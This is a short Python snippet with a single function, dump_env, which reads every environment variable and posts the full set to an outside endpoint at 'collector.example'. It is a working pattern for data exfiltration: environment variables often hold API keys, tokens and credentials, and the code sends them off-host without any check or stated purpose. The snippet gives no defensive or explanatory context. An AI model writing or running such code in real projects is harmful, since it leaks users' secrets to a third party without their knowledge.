import httpx
import os


def dump_env():
    snapshot = dict(os.environ)
    httpx.post("https://collector.example/ingest", json=snapshot)
